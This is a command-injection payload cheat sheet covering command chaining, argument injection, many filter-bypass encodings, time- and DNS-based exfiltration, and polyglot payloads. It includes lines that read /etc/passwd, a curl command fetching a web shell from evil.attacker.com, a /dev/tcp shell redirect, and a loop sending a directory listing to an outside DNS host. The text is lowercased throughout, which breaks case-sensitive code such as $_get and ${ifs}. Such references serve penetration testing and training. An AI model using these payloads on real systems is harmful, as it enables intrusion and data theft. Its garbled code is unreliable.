# command injection

> command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.


## summary

* [tools](#tools)
* [methodology](#methodology)
    * [basic commands](#basic-commands)
    * [chaining commands](#chaining-commands)
    * [argument injection](#argument-injection)
    * [inside a command](#inside-a-command)
* [filter bypasses](#filter-bypasses)
    * [bypass without space](#bypass-without-space)
    * [bypass with a line return](#bypass-with-a-line-return)
    * [bypass with backslash newline](#bypass-with-backslash-newline)
    * [bypass with tilde expansion](#bypass-with-tilde-expansion)
    * [bypass with brace expansion](#bypass-with-brace-expansion)
    * [bypass characters filter](#bypass-characters-filter)
    * [bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
    * [bypass with single quote](#bypass-with-single-quote)
    * [bypass with double quote](#bypass-with-double-quote)
    * [bypass with backticks](#bypass-with-backticks)
    * [bypass with backslash and slash](#bypass-with-backslash-and-slash)
    * [bypass with $@](#bypass-with-)
    * [bypass with $()](#bypass-with--1)
    * [bypass with variable expansion](#bypass-with-variable-expansion)
    * [bypass with wildcards](#bypass-with-wildcards)
* [data exfiltration](#data-exfiltration)
    * [time based data exfiltration](#time-based-data-exfiltration)
    * [dns based data exfiltration](#dns-based-data-exfiltration)
* [polyglot command injection](#polyglot-command-injection)
* [tricks](#tricks)
    * [backgrounding long running commands](#backgrounding-long-running-commands)
    * [remove arguments after the injection](#remove-arguments-after-the-injection)
* [labs](#labs)
    * [challenge](#challenge)
* [references](#references)


## tools

* [commixproject/commix](https://github.com/commixproject/commix) - automated all-in-one os command injection and exploitation tool
* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - an oob interaction gathering server and client library


## methodology

command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable application. this vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, http headers, etc.) to a system shell. in this context, the system shell is a command-line interface that processes commands to be executed, typically on a unix or linux system.

the danger of command injection is that it can allow an attacker to execute any command on the system, potentially leading to full system compromise.

**example of command injection with php**:    
suppose you have a php script that takes a user input to ping a specified ip address or domain:

```php
<?php
    $ip = $_get['ip'];
    system("ping -c 4 " . $ip);
?>
```

in the above code, the php script uses the `system()` function to execute the `ping` command with the ip address or domain provided by the user through the `ip` get parameter.

if an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual command that gets executed would be: `ping -c 4 8.8.8.8; cat /etc/passwd`.

this means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd` command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.


### basic commands

execute the command and voila :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```


### chaining commands

in many command-line interfaces, especially unix-like systems, there are several characters that can be used to chain or manipulate commands. 


* `;` (semicolon): allows you to execute multiple commands sequentially.
* `&&` (and): execute the second command only if the first command succeeds (returns a zero exit status).
* `||` (or): execute the second command only if the first command fails (returns a non-zero exit status).
* `&` (background): execute the command in the background, allowing the user to continue using the shell.
* `|` (pipe):  takes the output of the first command and uses it as the input for the second command.

```powershell
command1; command2   # execute command1 and then command2
command1 && command2 # execute command2 only if command1 succeeds
command1 || command2 # execute command2 only if command1 fails
command1 & command2  # execute command1 in the background
command1 | command2  # pipe the output of command1 into command2
```


### argument injection

gain a command execution when you can only append arguments to an existing command.
use this website [argument injection vectors - sonar](https://sonarsource.github.io/argument-injection-vectors/) to find the argument to inject to gain command execution.

* chrome
    ```ps1
    chrome '--gpu-launcher="id>/tmp/foo"'
    ```

* ssh
    ```ps1
    ssh '-oproxycommand="touch /tmp/foo"' foo@foo
    ```

* psql
    ```ps1
    psql -o'|id>/tmp/foo'
    ```

argument injection can be abused using the [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) technique.

in the following example, the payload `＂ --use-askpass=calc ＂` is using **fullwidth double quotes** (u+ff02) instead of the **regular double quotes** (u+0022)

```php
$url = "https://example.tld/" . $_get['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));
```

sometimes, direct command execution from the injection might not be possible, but you may be able to redirect the flow into a specific file, enabling you to deploy a web shell.

* curl
    ```ps1
    # -o, --output <file>        write to file instead of stdout
    curl http://evil.attacker.com/ -o webshell.php
    ```
    

### inside a command

* command injection using backticks. 
  ```bash
  original_cmd_by_server `cat /etc/passwd`
  ```
* command injection using substitution
  ```bash
  original_cmd_by_server $(cat /etc/passwd)
  ```


## filter bypasses

### bypass without space

* `$ifs` is a special shell variable called the internal field separator. by default, in many shells, it contains whitespace characters (space, tab, newline). when used in a command, the shell will interpret `$ifs` as a space. `$ifs` does not directly work as a separator in commands like `ls`, `wget`; use `${ifs}` instead. 
  ```powershell
  cat${ifs}/etc/passwd
  ls${ifs}-la
  ```
* in some shells, brace expansion generates arbitrary strings. when executed, the shell will treat the items inside the braces as separate commands or arguments.
  ```powershell
  {cat,/etc/passwd}
  ```
* input redirection. the < character tells the shell to read the contents of the file specified. 
  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```
* ansi-c quoting 
  ```powershell
  x=$'uname\x20-a'&&$x
  ```
* the tab character can sometimes be used as an alternative to spaces. in ascii, the tab character is represented by the hexadecimal value `09`.
  ```powershell
  ;ls%09-al%09/home
  ```
* in windows, `%variable:~start,length%` is a syntax used for substring operations on environment variables.
  ```powershell
  ping%commonprogramfiles:~10,-18%127.0.0.1
  ping%programfiles:~10,-5%127.0.0.1
  ```


### bypass with a line return

commands can also be run in sequence with newlines

```bash
original_cmd_by_server
ls
```


### bypass with backslash newline

* commands can be broken into parts by using backslash followed by a newline
  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```
* url encoded form would look like this:
  ```powershell
  cat%20/et%5c%0ac/pa%5c%0asswd
  ```


### bypass with tilde expansion

```powershell
echo ~+
echo ~-
```

### bypass with brace expansion

```powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```


### bypass characters filter

commands execution without backslash and slash - linux bash

```powershell
swissky@crashlab:~$ echo ${home:0:1}
/

swissky@crashlab:~$ cat ${home:0:1}etc${home:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### bypass characters filter via hex encoding

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### bypass with single quote

```powershell
w'h'o'am'i
wh''oami
'w'hoami
```

### bypass with double quote

```powershell
w"h"o"am"i
wh""oami
"wh"oami
```

### bypass with backticks

```powershell
wh``oami
```

### bypass with backslash and slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

### bypass with $@

`$0`: refers to the name of the script if it's being run as a script. if you're in an interactive shell session, `$0` will typically give the name of the shell.

```powershell
who$@ami
echo whoami|$0
```


### bypass with $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

### bypass with variable expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### bypass with wildcards

```powershell
powershell c:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```


## data exfiltration

### time based data exfiltration

extracting data char by char and detect the correct value based on the delay.

* correct value: wait 5 seconds
  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  real    0m5.007s
  user    0m0.000s
  sys 0m0.000s
  ```

* incorrect value: no delay
  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
  real    0m0.002s
  user    0m0.000s
  sys 0m0.000s
  ```


### dns based data exfiltration

based on the tool from [holyvier/dnsbin](https://github.com/holyvier/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)

1. go to http://dnsbin.zhack.ca/
2. execute a simple 'ls'
  ```powershell
  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
  ```

online tools to check for dns based data exfiltration:

- http://dnsbin.zhack.ca/
- https://app.interactsh.com/
- burp collaborator


## polyglot command injection

a polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. when we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.

* example 1:
  ```powershell
  payload: 1;sleep${ifs}9;#${ifs}';sleep${ifs}9;#${ifs}";sleep${ifs}9;#${ifs}

  # context inside commands with single and double quote:
  echo 1;sleep${ifs}9;#${ifs}';sleep${ifs}9;#${ifs}";sleep${ifs}9;#${ifs}
  echo '1;sleep${ifs}9;#${ifs}';sleep${ifs}9;#${ifs}";sleep${ifs}9;#${ifs}
  echo "1;sleep${ifs}9;#${ifs}';sleep${ifs}9;#${ifs}";sleep${ifs}9;#${ifs}
  ```
* example 2: 
  ```powershell
  payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

  # context inside commands with single and double quote:
  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  echo "yourcmd/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
  echo 'yourcmd/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
  ```


## tricks

### backgrounding long running commands

in some instances, you might have a long running command that gets killed by the process injecting it timing out.
using `nohup`, you can keep the process running after the parent process exits.

```bash
nohup sleep 120 > /dev/null &
```

### remove arguments after the injection

in unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. after `--`, all arguments are treated as filenames and arguments, and not as options.


## labs

* [portswigger - os command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
* [portswigger - blind os command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
* [portswigger - blind os command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
* [portswigger - blind os command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
* [portswigger - blind os command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
* [root me - php - command injection](https://www.root-me.org/en/challenges/web-server/php-command-injection)
* [root me - command injection - filter bypass](https://www.root-me.org/en/challenges/web-server/command-injection-filter-bypass)
* [root me - php - assert()](https://www.root-me.org/en/challenges/web-server/php-assert)
* [root me - php - preg_replace()](https://www.root-me.org/en/challenges/web-server/php-preg_replace)

### challenge

challenge based on the previous tricks, what does the following command do:

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

**note**: the command is safe to run, but you should not trust me.


## references

- [argument injection and getting past shellwords.escape - etienne stalmans - november 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
- [argument injection vectors - sonarsource - february 21, 2023](https://sonarsource.github.io/argument-injection-vectors/)
- [back to the future: unix wildcards gone wild - leon juranic - june 25, 2014](https://www.exploit-db.com/papers/33930)
- [bash obfuscation by string manipulation - malwrologist, @dissectmalware - august 4, 2018](https://twitter.com/dissectmalware/status/1025604382644232192)
- [bug bounty survey - windows rce spaceless - bug bounties survey - may 4, 2017](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
- [no php, no spaces, no $, no {}, bash only - sven morgenroth - august 9, 2017](https://twitter.com/asdizzle_/status/895244943526170628)
- [os command injection - portswigger - 2024](https://portswigger.net/web-security/os-command-injection)
- [security café - exploiting timed-based rce - pobereznicenco dan - february 28, 2017](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
- [tl;dr: how to exploit/bypass/use php escapeshellarg/escapeshellcmd functions - kacperszurek - april 25, 2018](https://github.com/kacperszurek/exploits/blob/master/gitlist/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
- [worstfit: unveiling hidden transformers in windows ansi! - orange tsai - january 10, 2025](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)